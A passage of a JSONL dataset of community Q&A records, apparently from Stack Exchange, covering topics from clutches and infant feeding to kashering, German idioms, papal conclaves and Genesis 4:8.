Loyd, and Daniel I. Sessler. “Anesthetic Requirement Is Increased in Redheads.” Anesthesiology 101, no. 2 (August 2004): 279–283.\n\n", "question_score": "9", "answer_score": 16}
{"title": "I seem to lose muscle size quickly if not working out for some time. Why?", "description": "Not months of lay off but no more than 10 days takes my muscles, especially of my arms, from looking big and feeling hard to something that doesn't make me look like I lift serious weight. It stays in good shape and feel for up to a week of not working out but anything more than that and this happens.\nWhy does this happen?\nI don't lose strength though. I consume enough protein as well.\nIs this just my body type or is there any solution for this?\n", "answer": "Your body is adapting itself to the lower demands you are placing on it.  There are two basic types of adaptation that your body can go through when lifting weights:\n\nMyofibrillar hypertrophy--this increases the number of protein pairs per muscle cell.  In very basic terms, the more protein pairs the more work that muscle cell can do.  More myofibrillar hypertrophy translates to increased strength--but not necessarily bulk.\nSarcoplasmic hypertrophy--this increased the amount of energy support within each muscle cell.  In very basic terms, it allows you to lift for longer periods of time.  The energy support systems take up more room than protein pairs, and is responsible for the bulk that bodybuilders seek.\n\nWhen your body is detraining itself due to inactivity for longer periods of time, the first systems to unadapt themselves are the support systems.  It holds on to the strength part just in case it is still needed, but the body assumes that the need for that strength will be fewer and farther between.  This is why it is always a good idea to either repeat your last training cycle after an extended rest or take a small deload.\nIn your case, the sarcoplasmic hypertrophy that you attained while working out is starting to become unadapted (less sarcoplasmic fluid in the muscle cells).  The myofibrillar hypertrophy takes longer to unadapt (or adapt to lower levels).\nBottom line: the longer you go without training, the more you will lose endurance/size (first) and strength (second).  However, because your body knows how it needs to adapt when you start training it again, you will get back to your trained state quicker.\n", "question_score": "9", "answer_score": 16}
{"title": "How does a clutch work?", "description": "I understand how a clutch can separate the flywheel from the clutch disk so that power is disconnected from the engine.\nWhen that happens, does the input shaft (along with the countershaft) stop immediately? \nIf they are moving, they should have some rotational energy, how is all the energy lost in one second and it stops?\n", "answer": "A basic clutch is made up of three major parts:\n\nFlywheel\n\nFriction disk\n\nPressure plate\n\n(NOTE: These three pieces do not actually go together. I'm using the pictures for illustrative purposes.)\nThe flywheel is attached to the back of the engine. The pressure plate is attached to the flywheel. Sandwiched in between the two is the friction disk. The friction works a lot like brake pads, in that it grips the flywheel/pressure plate on either side through, what else, friction.\n\nThe splined input shaft of the transmission is placed through the friction disk and rides on a pilot bearing at the center of the flywheel. When you press the clutch pedal, the the throwout bearing is pushed against the clutch fingers, which pulls the plate away from the flywheel. When the pressure plate is pulled away, it allows for enough space between the to for a decoupling and the friction disk is allowed to spin freely. This disconnects the power output of the engine from going to the transmission. When you release the clutch pedal, the plate moves back towards the flywheel, recapturing the friction disk and power is restored to the transmission.\nPlease not, it's not that the input shaft stops immediately when the clutch is disengaged. It's just that each entity (engine and transmission) are allowed to operate independently of each other at that point. This gives you time to change gears or prepare for a stop.\n", "question_score": "9", "answer_score": 11}
{"title": "Should we give our infant baby food to avoid feeding at night?", "description": "Our little boy is 4 and half months old. He weights around 7.5 kg. He wakes up many times at night for milk.\nShall we start giving him baby food so that he does not feel hungry at night?\n", "answer": "Early weaning probably won't help your baby sleep through the night.\nhttp://www.babycentre.co.uk/baby/sleep/solidsexpert/\n\nNo research supports this belief. Young babies given solid food (and this includes rice cereal in their bottle) at a young age, do not sleep any better than babies who are not given solid foods. \nIt's an old wives' tale based on the mistaken assumption that young babies need solids such as baby rice to help them sleep through the night. The Department of Health recommends that babies should not be given solid foods before six months. \n\nhttp://wholesomebabyfood.momtastic.com/tipcerealinbottle.htm\n\nWe know that many are probably tempted to try the old \"cereal in the bottle\" trick to gain an extra 1 hour (heck even an extra 20 minutes.) of sleep. We also know that this is one of the biggest and possibly one of the more dangerous practices you could engage in.\nIt is not a good idea because you may throw the \"I'm full\" instinct off kilter; more importantly, babies have been known to aspirate cereal when cereal is mixed in a bottle with formula or breast milk.  Babies who are younger than 4-6 months old seldom know how to properly swallow anything other than breast milk or formula and gulping or \"inhaling\" a bottle with cereal in it may have deadly consequences.\n\nRecommendations are that babies get nothing  but breast milk for the first six months; or formula if breast feeding is not possible.  There are important health reasons for this.\nThere are techniques you could try to help your child sleep through.\nhttp://www.nhs.uk/Planners/birthtofive/Pages/Babysleeptips.aspx\n\nDisturbed nights can be very hard to cope with. If you have a partner, get them to help.\n  If you’re formula feeding, encourage your partner to share the feeds. If you’re breastfeeding, ask your partner to take over the early morning changing and dressing so that you can go back to sleep.\n  Once you’re into a good breastfeeding routine, your partner could occasionally give a bottle of expressed breast milk during the night. If you’re on your own, you could ask a friend or relative to stay for a few days so that you can sleep.\n\nSome people might suggest 'controlled crying', but that's not really suitable for babies under six months.\nIf you decide that you still want to wean early, you could read this advice about what foods to avoid.\nhttp://www.nhs.uk/Planners/birthtofive/Pages/Weaningfirststeps.aspx\n", "question_score": "8", "answer_score": 11}
{"title": "Sousaphone for child", "description": "My grandson is in love with the Tuba.  I wish everyone that loves that instrument could see him.  He walks around air playing it all the time.  He is a great big Georgia Bulldog fan and especially loves the Redcoats.  I would love to buy him a youth size one, but haven't been able to locate one.  Is there such a thing?  If not we have been trying to figure out how to make one.  Any ideas?  thanks, Anita Carver\n", "answer": "Assuming the stumbling block you are facing is the physical size of your grandson vs. a tuba or sousaphone, there's only so much you can do to reduce the standard instrument's size. Unlike string instruments, which offer smaller versions of themselves tuned the same way, wind instruments require a tube of a certain length to play the proper tone.\nTubas do come in a number of different keys, and some of these by definition will be smaller than others. The \"standard\" for concert band playing is \"BBb\" (plays the Bb harmonic series, fundamental on Bb0, reads concert key).\nAdditionally, tubas of a single key can vary in diameter, and by extension, overall weight and bore size. A \"3/4\" size instrument is the typical starter size, and is the smallest. Larger instruments are referred to as 4/4, 5/4, and even 6/4.\nSousaphones generally are all built to the same design, which is to make as much sound as possible as a marching instrument. As such, they're large, and heavy.\nNow that that's out of the way,\nThe general wisdom is to start tuba players on the smallest instrument possible. 3/4 size BBb instruments are almost always designed for beginners, and thus will be the smallest size possible. However, this is already quite a large instrument. For this reason, many young beginners (ages 10-11) will start playing on a close cousin of the tuba: the Euphonium.\n<-Yamaha YEP-201\nThis instrument uses a mouthpiece (mostly) identical to a trombone's, and is pitched one octave higher than the tuba. It also comes in a bell-front variety, which is often confused for a baritone horn. Baritone horns are actually quite rare (the difference is in the amount of cylindrical tubing vs. conical), but that instrument has an even smaller cousin that might be an appropriate alternative if even the euphonium is too big: a tenor horn or alto horn in Eb.\nIf that weren't enough, there's also a tenor tuba pitched in C that's about the same size as a euphonium, and Wagner tubas which play like french horns and are oval in shape. Long story short, there are a ton of instruments out there, and if it looks like a small tuba, it probably plays like one. Brass instrument technique transfers easily from one instrument to another, so there's no harm in starting a student on a smaller instrument even if it uses a different mouthpiece and different fingerings.\nA child around age 10 who has ambitions of playing the tuba should probably start on a small-bore three-valve euphonium (throw out the starting mouthpiece and get a 'small shank' Bach 6-1/2AL). If he or she is even younger and that instrument is too big, then really anything goes, all the way up to Cornet as the absolute smallest.\n", "question_score": "9", "answer_score": 17}
{"title": "Kashering pot from meat to dairy/parev?", "description": "I know I've learned somewhere that you can't kasher a meaty pot for use with dairy (except for Pesach), but I can't find a source for it now.  Can anyone provide a source?  (The sauce would be a light Alfredo; the source would be somewhere in Yoreh Deah I expect...)\nFollowing on from that, and hopefully to be found in the same source, is my more practical question: can you kasher a pot from meaty to pareve, so that you could cook pasta to be eaten with that yummy Alfredo sauce?\n", "answer": "The Sefer הכשרות by רב יצחק יעקב פוקס explains as follows (chapter 3:5)\n\nFor Sefardim, as long as the item is not ben yomo (has not been used for cooking with dairy/meat) in the last day, it is permissible to change from Dairy to Meat, even lechatchila. Sources: Pri Chadash YD 97:1, Chidah - Machzik Beracha 509:2, Aruch haShulchan YD end of siman 89 and 181:11, Yabia Omer YD 3:4.\nFor Ashkenazim the minhag is not to change from one type to the next (Magen Avraham OC 509:11 - since if you get used to changing over, you might make a mistake and kasher a ben yomo pot by mistake) unless it is one of the following circumstances:\n\nSha'at haDechak - Pressing Need/No other choice (i.e.: you need to use the pot for something pressing) (Prim Megadim Eishel Avraham OC 152:13)\nKashering pre-Pesach to get rid of chametz, can switch over from Meat/Dairy (Mishnah Berurah 451:19)\nIf you will use it for some period of time as a pareve pot before going to the other type (Shu\"t Maharsham 2:241, Tzitz Eliezer 9:38)\nIf it had become treif anyway (ex: it was a milk pot that was accidentally used for meat, when you kasher it you can change it to meat) (Mishnah Berurah 509:25, Shu\"t Be'er Moshe 3:105, Maharsham from above)\nIt hasn't been used for a year+ with its current milk/meat type (Shu\"t Maharsham from above)\nReceived it as a gift and want to change it\n\nIf you want to kasher using libun you can do so at any time, even for Ashkenazim (Sha'ar haMelech, Hil. Yom Tov, 4:8)\n\nFollowing from all of that, it seems that if you are Sefardi then as long as the pot is not ben yomo you can kasher to the other type. If you are Ashkenazi then you cant do it unless one of the conditions from above apply (I don't know if wanting yummy alfredo sauce would be considered a pressing need).\n", "question_score": "9", "answer_score": 11}
{"title": "When did Achashverosh stop rounding up fair maidens?", "description": "So first Achashverosh was married to Vashti. Then no more Vashti. Then he's rounding up all the fair maidens in the land to um, \"meet\" them, one per night, but they're still stuck in one of his royal properties afterwards. \nThen he finally meets Esther and declares her queen. Then the Megillah says \"when the maidens were rounded up a second time\" ...\nSo at what point (if ever?) did Achashverosh stop rounding up fair maidens?\nSo the practice started because \"oh he's so lonely and he needs a new queen\", but then it never stopped?\n", "answer": "The Gemara (Megillah 13a, bottom), cited by Rashi to the verse in Esther, says that this was Achashverosh's last-ditch attempt to get Esther to reveal her origins, since otherwise she might be replaced as queen.\n(It says that this was done at Mordechai's advice; thus the juxtaposition that \"Mordechai was sitting at the king's gate.\" Me'am Loez adds - I don't recall his source - that Mordechai actually had a reason of his own for this suggestion: to see whether indeed Esther's selection as queen had been ordained by Hashem - in which case Achashverosh would end up finding no one better - or not.)\nR. Eliezer Ashkenazi (Yosef Lekach), on the other hand, explains the other way around: now that Achashverosh had found his queen, he was ready to send all of the other candidates home. Since they were in different places in the palace complex or in the kingdom - some were with the agents who had been sent to look for them, others were already under the control of the officials mentioned in 2:3 (ויפקד המלך פקידים), still others in the first or second harem - this can be described as \"rounding them up.\" (The point, R. Ashkenazi goes on to say, is that even now that she was confirmed as queen and there was no reason for her to fear reprisals against her family or nation for her having tried to evade being chosen, she still continued to obey Mordechai's orders and keep her secret.)\nMaharal (Ohr Chodosh) seems to say that indeed it was a regular occurrence: the women were brought to the harem in groups (and then each one had her night with the king), and this was the arrival of the next group after Esther had been crowned as queen; Achashverosh might well have selected some of them as concubines. (Maharal therefore explains the relevance of the statement that \"Mordechai was sitting at the king's gate\" almost exactly the opposite of the Gemara's explanation: he wanted to keep encouraging her not to be afraid that she'd be replaced, but to keep her secret.)\nR. Yaakov of Lissa (Megillas Sesarim) explains that Achashverosh didn't want to be intimate with Esther. First of all, since she wasn't telling her lineage, any children he'd have with her might be of ignoble origin; second, if she became pregnant she might lose her beautiful looks. So he had more girls brought to become his wives and concubines, but kept Esther as queen because of her beauty; she liked this arrangement - not being forced to have relations with Achashverosh - and therefore kept from him the information about her lineage that might have made him desire her more.\n", "question_score": "9", "answer_score": 11}
{"title": "Asking someone to be patient", "description": "When someone is being impatient, in English you could say \"please be patient\", \"just a moment please\" or even the slight slang of \"hang on.\"  What is the equivalent in German?\nI know you can say \"einen Moment, bitte\"; but does that really convey the equivalent of \"be patient\"?  Or is that quite literally \"one moment, please\"?\nIs there a German slang equivalent to \"hang on\"?\n", "answer": "There are, as in English, various ways of expressing this. \n\nEinen Moment, bitte or einen Augenblick, bitte -- this is absolutely common, sufficiently polite and probably the exact counterpart to One moment, please. You'd say that at the phone if you need to look up something. It's rather neutral, you don't indicate you are feeling pushed (you may add that effect by e.g. raising your voice)\nEtwas (mehr) Geduld, bitte or Haben Sie bitte etwas mehr Geduld-- this is what you'd say to someone who is trying to push you a little when you want to ask him (politely) to allow for more time. Still polite, but you indicate you are feeling pushed (a bit) and possibly even that you don't like it. It's more the be patient variant. Ich möchte Sie um etwas mehr Geduld bitten is the same but even more formal.\nhang on: this I would probably translate as 'Sekunde  (one single word, meaning wart' mal 'ne Sekunde, which you could also say. Warten Sie mal eine Sekunde could be used in a more formal context (office)).Alternatives are Augenblick, Augenblick mal (same thing as Sekunde), Moment, usage of diminutives is common, too: Momentchen, Sekündchen. Less formal, but not really slang. \nimmer mit der Ruhe is what you could say if someone is going to panic or is beginning to push hard. This may be perceived as colloquial, depending on who says it and who is adressed. (You did not ask for that one :-).\n\nThe list could be continued.\n", "question_score": "9", "answer_score": 16}
{"title": "Is it true that all Japanese words end in a vowel when transliterated to English?", "description": "First off I know zero Japanese, so sorry if this is a stupid question.  I seem to remember hearing a while back that all Japanese words, when transliterated to the Latin alphabet, will end in a vowel.  From the few Japanese words/names I've seen this seems possible.  \nIs there any truth to this?  If true, does anyone know why that is?\n", "answer": "(See the other answers for translate vs. transliterate.)\nIt's due to Japanese's syllable structure. English allows some spectacularly complicated syllables (strengths being a good maximal example*), but Japanese doesn't - its allowed syllable structure is (C)V(N/Q), where C is any consonant, V is any vowel, N is the nasal ん (which can vary in pronunciation depending on what follows it), and Q is the っ consonant-length-extension-phoneme-thing (which can't occur unless it's before a consonant that can be lengthened).\nSo you can have words that end in /N/, but most of the time you're going to have a vowel. Primarily this is because almost without exception /N/ only occurs in Chinese loanwords (though a few native Japanese words (especially verb forms) have gained an /N/ since its introduction) - so most native words end in vowels. Indeed, most native words will alternate between consonants and vowels (partly due to Old Japanese not liking adjacent vowels - the most common word shape by -far- is (C)VCV).\nThere are languages (e.g. most Polynesian ones) which cannot, under any circumstances, have syllables that end in consonants. Japanese used to be that way, but under the influence of Chinese, it has gained two syllable-final consonant phonemes. So you will get words that end in /N/, but mostly words will only end in vowels.\n*(English's syllable structure works out to something like (s)(C)(L)V(N/L)(C)(s), where L is either l or r and N is any nasal (n, m, ng) - there are some further rules on which consonants can occur next to each other in certain positions (so trV is okay, but tlV isn't), but that description's mostly accurate. Strengths is pretty much the biggest you can have.)\n", "question_score": "9", "answer_score": 15}
{"title": "What did Heidegger get wrong about Hölderlin?", "description": "The reason we know very much about Hölderlin isn't from Schelling or Hegel who actually knew him, but from Heidegger, many years after his death, to help fill out the nature of art in his ontology. Over the years, though, I've heard many people smarter than I am say that Heidegger's interpretation of Hölderlin was deeply flawed.\nNow, granted, Heidegger and Hölderlin focused on very different things, but I've never been able to get a clear and concise sense of what Heidegger got wrong about his Hölderlin lectures. Does anyone understand it well enough to condense it down to a few paragraphs?\n", "answer": "Long story short: This has already been done by scholars, but...\nSee e.g. (and for further reading and sources) Gosetti-Ferencei, Jennifer Anna. Heidegger, Hölderlin, and the subject of poetic language: Toward a new poetics of Dasein. Fordham Univ Press, 2004:\n\nIt has been pointed out that Heidegger both comes \n  closer to Hölderlin than any other reader ever has to any poet, and, at \n  the same time, that \"Hölderlin says exactly the opposite of what Heidegger makes him say\" (Paul de Alan) - that \"Hölderlin's poetry is \n  turned into its opposite by the use Heidegger makes of it\" (Otto Pöggeler). Derrida has suggested that Heidegger's interpretations \n  are a \"catastrophe\", and the reader who takes note of the political \n  undercurrents in Heidegger's interpretations - particularly in the lecture courses on Hölderlin - is puzzled in comparing Heidegger's political gestures to Hölderlin's largely ignored - and in Heidegger's reading almost entirely silenced - political thinking (p. 8)\n\nIn essence, the criticism is detailed and spread over a couple of works. It is quite impossible to nail it down in a few paragraphs in its entirety without losing much of the good content produced over the decades on that topic. \nOne of the more detailed ones with both acceptable length and detail can be found in form of the title-giving essay of Henrich, D., & Förster, E. (1997). The Course of Remembrance and Other Essays on Hölderlin. Stanford University Press :\n\n\"The Course of Remembrance” contains perhaps\n  the most detailed account of Henrich’s multifaceted and complex critique of Heidegger, who himself had devoted a lecture course and an\n  inﬂuential essay to the interpretation of this poem (p. 10)\n\nThe sources I read on the topic agree on that Heidegger is actively making Hölderlin \"his\" Hölderlin, i.e. uses him for what he himself wants to say instead of even considering what Hölderlin himself has actually thought or meant. He even straight out denied the relevance or need of understanding Hölderlin's philosophical and historical setting, which he justified by his own take on how philosophy (or rather it's destruction) should look like. This encompasses especially the political and theoretical thinking of Hölderlin. \nRegarding the theoretical thinking, one must bear in mind that Judgment and Being - Hölderlin's most important fragment on theoretical philosophy, having had great impact in the interpretation of Hölderlin's poetical work as well - had not been published before 1970 and one would be misguided to criticise Heidegger for not taking it into consideration - apart from his methodological reasons for not doing so anyway - though.\nThis little fragment and its impact could be an additional reason why people think Heidegger got it all the more wrong - from a contemporary perspective. But in general, the interpretating Heidegger did not even want to understand Hölderlin himself, despite the reciting Heidegger showing his magnificent knowledge of Hölderlin's poetry.\n", "question_score": "9", "answer_score": 10}
{"title": "How do I remove dandelions without damaging my lawn?", "description": "My lawn is infested with dandelions. Although they're benign, the flowers are fun to play with and the plant has several useful properties, it sure is an eyesore and I'd like to get rid of it. How can I eradicate this weed without damaging my lawn?\n\nSource: Wikimedia commons\n", "answer": "There are several ways of removing these dandelions from your lawn:\n\nIf you have a cool-season lawn and are happy to take the chemical route, you could use a selective weedkiller containing 2,4-D or MCPP, such as Trimec, Speedzone or Momentum, which are best applied in mid-spring or early fall\nYou could hand-weed using this tool which has received excellent reviews, and would make your task much easier; however, bear in mind that if you leave even a small fragment of dandelion root in the soil, it will produce a new plant.\n\nGood lawn maintenance is also essential to keep your lawn weed-free:\n\nSince dandelions thrive on thin weak turf, a good preventative measure is proper lawn maintenance.\nMow high and mow often. Mowing high means keeping your grass on the longer side of its optimal height. This keeps the soil cooler and provides shade that restricts the growth of annual weeds. Weed seeds on the soil surface need the heat of the sun to flourish. Scalping your lawn is an open invitation for weeds. Second, once weeds have already invaded your lawn, frequent mowing will keep them in check. A weed can't form seedheads when its topmost growth keeps getting lopped off.\nFertilize at the correct times. The goal is to feed your lawn, not your weeds. Cool season grasses should be fertilized in early spring and late fall. Fertilizing cool season grasses in the heat of the summer will only promote more weeds. Warm season grasses should be fertilized at the height of their growth period in the summer. Avoid feeding in the cooler spring or summer when the weeds are likely to emerge.\nWater deeply and infrequently. There are weed seeds hiding out in your lawn just waiting for the right conditions to emerge. Those seeds grow best when kept damp with light frequent watering.\nReseed in the Fall. The fall is the best time to reseed for several reasons. Grass has nine months to get its roots deep and to get more established before facing the summer heat. It has a better chance surviving than grass planted in the spring. In the North, crabgrass and other weeds complete their life cycles in the fall and die out. So they aren't there to compete with the new seedlings for space, water, and soil nutrients.\n\nWhat Will Kill Dandelions?\n", "question_score": "30", "answer_score": 19}
{"title": "Can I use Korean Air's mileage for Delta domestic flights?", "description": "I am considering an airline credit card. I currently live in the U.S. and frequently fly domestic, say once a month. \nI also annually fly to South Korea.\n\nIf I use the Korean Air's mileage program and its credit card, what are pros and cons? \nCan I use the Korean Air's mileage for free Delta domestic flights? Both are SkyTeam.\n\n", "answer": "As a general rule, you should join the mileage program for the airline that you want to fly when you redeem your miles. While it is possible to redeem miles on partner airlines, there are several disadvantages:\n\nAvailability is typically much more limited when trying redeem miles on partner flights. Also, it's often impossible to check availability on partner airlines using the online site and you will have to have an agent assist you.\nMileage \"prices\" are not always symmetrical. It is sometimes more expensive to reserve a reward flight on a partner airline than it would be to use miles on the same airline. For example, reserving a Delta flight using Korean miles might be more expensive than booking the same flight using Delta miles.\nFrequent flyer programs are usually targeted to the airlines home-market. Mileage credit card offers and other partner promotions are typically targeted to those customers. For example, credit cards that are only issued in Korea, hotel partners only in Korea, etc.    \nFinally, it may be more complicated to book reward tickets outside of the home-market (no local phone number, website that takes foreign credit cards etc.)\n\nThat being said, in some cases when it is possible to earn miles faster on the \"other\" airline, you could consider using their program. For example, if you have an elite status, use a mileage credit card or the airline is offering other promotions. In this case, you should consider the trade-off of earning miles faster versus the problems mentioned above.\nEDIT Just noticed, for example, the Delta offers a special \"Low\" economy class reward for only 12,500 miles whereas the cheapest reward using Korea miles for a USA domestic flight is 25,000.\n", "question_score": "9", "answer_score": 10}
{"title": "Are dogs allowed on the Trans-Siberian railway?", "description": "There's a couple of guys from France here in my hostel in Tbilisi with a couple of huskies (or similar dogs).\nTheir plan is to travel to Russia from here then take the Trans-Siberian to Mongolia.\nBut a bit of Internet searching turns up nothing real about whether they'll be able to take their dogs on this train or what special rules and regulations might apply.\nI realize the Trans-Siberian isn't just a single railway but made up of smaller ones so I suppose there is some chance the rules might vary from one part to the next.\n", "answer": "There is no changes in rules, because the carrier is the same - RZD.\nAbout the dog transit rules:\nYou must have all medical information about pet, and you must pay for additional ticket. Also you must honor the sanitary rules in the train you are using.\nThere are two options for this transit - and it depends on size of the dog.\nFor small dogs the rules are very simple - you put it in the special container and it counts as your luggage and you can borrow it to 1st class and 2nd class (you cannot book sleeping wagons and business class trains). \nFor big dogs the situation is more about the money you will spend for the transit:\nOptions you have:  \n\nSpecial not-in-use box in the first wagon of the train.\nFully-paid room (4 tickets) in 1st class (you cannot book sleeping wagons and business class trains).\n\nLink in Russian\nThe only link in English about transporting animals in trains (not very applicable for the Trans-Siberian, but better than nothing):\n\nPassengers may transport pets if such transportation is not prohibited by vets, customs or other regulations of the Russian Federation and the Republic of Finland.\nPassengers may take no more than two dogs on a leash or not more than two cages or one dog on a leash and one cage. Cages must be 60x45x25 cm maximum. Several animals may be taken in one cage.\nAnimals must not be placed in carriage aisles or vestibules.\nPassengers travelling with pets are responsible for their animal(s) and for any inconvenience or damage caused by animals.\nAnimals are prohibited in first class carriages\n\n", "question_score": "9", "answer_score": 10}
{"title": "Remplacer æ par ae est-il acceptable ?", "description": "Pour une certaine valeur d'« acceptable », évidemment.\nLa ligature æ n'est plus employée que pour quelques mots rares, Wikipédia cite entre autres \n\ncæcum, nævus, præsidium (forme utilisée concurremment à présidium), tænia (forme utilisée concurremment à ténia), ex æquo, curriculum vitæ et cætera\n\nCompte tenu de la relative difficulté de l'obtenir, en particulier avec un clavier AZERTY sous MS Windows, est-il acceptable de la remplacer par ae ? L'Académie a-t-elle donné son avis sur ce sujet ?\n", "answer": "Le Petit Robert 1993 donne cæcum, nævus, présidium (variante præsidium), ténia (variante tænia), ex æquo, curriculum vitæ, et et cætera sur un pied d'égalité avec et cetera. Il mentionne aussi cæsium comme variante de césium. Voici la liste des mots qui commencent par ae ou une variante diacritique, à l'exclusion de la racine aéro- : aède, aèdès ou aedes, ægagropile ou égagropile, ægosome ou égosome, æpyornis ou épyornis, æschne, æthuse ou éthuse, aétite.\nLe Trésor de la langue française donne cæcum ou cœcum (et signale que l'Académie admettait cœcum autrefois, mais plus depuis 1935), naevus, præsidium ou présidium, ténia (la graphie tænia n'apparaît que dans la section historique), ex aequo ou ex-aequo (mais pas æquo), curriculum vitae, et cætera ou et cetera ou et cœtera (la graphie -œ- domine dans les exemples). Pour césium, aucune autre graphie n'est mentionnée. En initiale, il y a aède, ægagre, ægilops et dérivés, ægipan, aélodicon ou ælodicon, aémère ou ahémère, æolian, æoline, æolipyle ou éolipyle, æolis, æpyornis, æschne, æthéogame et dérivés, ætherophon, aétite ou ætite, aevia.\nLa plupart de ces mots sont trop peu courants pour que Google Ngram donne un résultat intéressant, et en plus le résultat de la numérisation de æ est souvent ae. On peut voir que pour césium et caesium (ou cæsium), les deux graphies ont coexisté dès la découverte de l'élément, et que césium domine depuis les années 1930 tandis que caesium (ou cæsium) est moribond depuis les années 1970. Pour ténia et taenia (ou tænia), la graphie é l'emporte aussi aujourd'hui alors que les deux ont longtemps été au coude à coude.\nContrairement à œ qui apparait dans des mots courants, æ n'apparaît que dans des mots rares, tous dérivés d'un mot latin orthographié ae. On peut donc légitimement soutenir que æ est une variante de graphie de ae, alors que œ est une lettre à part entière.\nLes caractères æ et Æ sont présents dans le jeu latin 1, qui était et est encore le jeu de caractères le plus courant sur les ordinateurs de francophones qui n'utilisent pas Unicode. Latin 1 n'inclut en revanche pas œ et Œ, ce qui fait que cette ligature a tendance à disparaître en ligne (et jusqu'au site du TLF !).\n", "question_score": "9", "answer_score": 10}
{"title": "Who calls the conclave?", "description": "There must be someone to oficially call the cardinals to a conclave. Who is it?\nIt can't be the old pope - resignation is hardly the normal situation, so the old pope is supposed to be dead. I guess it's some of the cardinals, probably Cardinal Camerlegno, but I'd be interrested in some proof.\n", "answer": "It is the Dean of the College of Cardinals, currently Cardinal Angelo Sodano. This role for the Dean is many centuries old. The present rules for the election of the Pope are mostly found in the Apostolic Constitution Universi Dominici gregis, issued by John Paul II in 1996. It contains the following:\n\n(19) The Dean of the College of Cardinals, for his part, as soon as he has been informed of the Pope's death by the Cardinal Camerlengo or the Prefect of the Papal Household, shall inform all the Cardinals and convoke them for the Congregations of the College. He shall also communicate news of the Pope's death to the Diplomatic Corps accredited to the Holy See and to the Heads of the respective Nations.\n\nAlthough this refers to the death of the Pope, the same provision applies in the case of resignation:\n\n(77) I decree that the dispositions concerning everything that precedes the election of the Roman Pontiff and the carrying out of the election itself must be observed in full, even if the vacancy of the Apostolic See should occur as a result of the resignation of the Supreme Pontiff, in accordance with the provisions of Canon 333 § 2 of the Code of Canon Law and Canon 44 § 2 of the Code of Canons of the Eastern Churches.\n\nThe citations are to the canons describing how a Pope resigns. UDG §38 confirms the role of the Dean in convoking the cardinals. \nAngelo Sodano, however, is 85 years old, and will not be taking part in the conclave - only cardinals under 80 at the time the See becomes vacant are electors. He is also restricted from presiding over the General Congregation, which is the daily meeting of all the Cardinals held before the conclave begins. He can still attend, but doesn't have to.\nUDG provides that if the Dean is unable to preside over the conclave himself, then his place is taken by the Sub-Dean (aka Vice-Dean). But this is Cardinal Roger Etchegaray, who is 90 years old! So instead, the role falls (UDG §9) to the senior cardinal who is actually able to take part. This will be Cardinal Giovanni Battista Re, because he is a cardinal bishop (first tier of precedence), and has been one for longer than the only other cardinal bishop who is under 80, Cardinal Tarcisio Bertone. (Cardinal Francis Arinze is 80, and Cardinal Jose Martins is 81. The patriarchs of the Eastern Catholic Churches rank just below the other cardinal bishops.)\nNonetheless, the formal announcement of §19 above could still be made by Cardinal Sodano himself, since all other mentions of \"Dean\" in the document include a proviso about the  substitution if the Dean is impeded, and this section just says \"Dean\". However, §38 allows another cardinal to do it in his name. This situation arose for the two conclaves of 1978, when both the dean (Cardinal Carlo Confalonieri, 85) and the vice-dean (Cardinal Paolo Morella, 83) were above the age of 80. The next-ranking elector, Cardinal Jean-Marie Villot, was the one who presided over the conclave, and he also sent the messages of summons. Interestingly, he was both Secretary of State and Camerlengo at the time, which probably added some weight to the idea that he should be responsible for the summons as well. (This took place under Romano Pontifici Eligendo, 1975, the predecessor to UDG, but the relevant law is basically the same; see §§19 and 39.)\nUpdate: A Catholic News Service report of 26 February 2013 quotes Father Federico Lombardi, Vatican spokesman, saying that the Dean, Angelo Sodano, will send out letters of summons on 1 March, including email or fax versions as well as the hard copies.\n", "question_score": "9", "answer_score": 12}
{"title": "What does Cain say to Abel in Genesis 4:8?", "description": "The Masoretic version of Genesis 4:8 reads as follows:\n\nוַיֹּאמֶר קַיִן, אֶל-הֶבֶל אָחִיו; וַיְהִי בִּהְיוֹתָם בַּשָּׂדֶה, וַיָּקָם קַיִן אֶל-הֶבֶל אָחִיו וַיַּהַרְגֵהוּ.\nAnd Cain said to his brother Abel, and it was when they were in the field that Cain rose up to Abel his brother and killed him.\n\nThe text has an obvious omission—what did Cain say to Abel? I don't want an answer that claims that \"wa-yomer Ka-in\" is a \"Cain spoke\", because the verb is not speak, it is say, and it requires embedded dialogue to be grammatical.\n", "answer": "The NET Bible textual criticism note is helpful here:\n\nThe MT has simply “and Cain said to Abel his brother,” omitting Cain’s words to Abel. It is possible that the elliptical text is original. Perhaps the author uses the technique of aposiopesis, “a sudden silence” to create tension. In the midst of the story the narrator suddenly rushes ahead to what happened in the field. It is more likely that the ancient versions (Samaritan Pentateuch, LXX, Vulgate, and Syriac), which include Cain’s words, “Let’s go out to the field,” preserve the original reading here. After writing אָחִיו (’akhiyv, “his brother”), a scribe’s eye may have jumped to the end of the form בַּשָּׂדֶה (basadeh, “to the field”) and accidentally omitted the quotation. This would be an error of virtual homoioteleuton. In older phases of the Hebrew script the sequence יו (yod-vav) on אָחִיו is graphically similar to the final ה (he) on בַּשָּׂדֶה.\n\nClarke's Commentary on the Bible points out: \n\nIn the most correct editions of the Hebrew Bible there is a small space left here in the text, and a circular mark which refers to a note in the margin, intimating that there is a hiatus or deficiency in the verse. \n\nI don't know what he means here by \"correct\" (it's not a helpful if it just means the ones that support his reading on this point), but it is interesting that some scribe were aware of the problem.  Also interesting is that they seem not to be aware or satisfied with the solution found in other versions.  So a reasonable possibility is that the MT lost a phrase and translators made their best guess about what was left out in order to produce a grammatically correct rendering in the target language.\nIt seems that many modern English translations supply the missing phrase from the Septuagint.  For instance, here is the NIV translation:\n\nNow Cain said to his brother Abel, \"Let’s go out to the field.\" And while they were in the field, Cain attacked his brother Abel and killed him.—Genesis 4:8\n\nOthers supply the extra text in the form of a footnote:\n\nCain spoke to Abel his brother.1 And when they were in the field, Cain rose up against his brother Abel and killed him.\n(Genesis 4:8 ESV)\n\n4:8 Hebrew; Samaritan, Septuagint, Syriac, Vulgate add Let us go out to the field\n\nBut whether the Masoretic Text dropped the phrase (due to scribal error) or the others added it  (to make the sentence more understandable) or both is somewhat unclear.  What's not unclear is that Abel's murder was premeditated.\n", "question_score": "6", "answer_score": 13}
